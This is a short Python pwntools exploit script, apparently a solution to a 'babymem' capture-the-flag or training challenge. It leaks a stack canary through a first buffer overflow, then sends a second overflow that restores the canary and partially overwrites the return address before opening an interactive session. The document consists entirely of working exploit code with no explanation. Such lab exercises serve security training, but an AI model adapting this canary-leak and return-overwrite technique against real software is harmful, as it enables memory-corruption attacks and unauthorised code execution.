#!/usr/bin/env python3

from pwn import *

# Create a process
p = process('/babymem_level14_testing2')

# Send payload size
p.sendline(b"233")

# Send payload
p.send(b"REPEAT" + b"a" * 227)

# Retrieve stack canary
line = p.recvline_startswith(b"You said: ")
stack_canary = int.from_bytes(line[243:250], "little")
log.info("Stack canary: " + hex(stack_canary))

# Re-enter function again
# Send payload size
p.sendline(b"522")

# Send payload
p.send(b"a" * 504 + p64(stack_canary * 256) + b"a" * 8 + p16(0x1deb))
p.interactive()
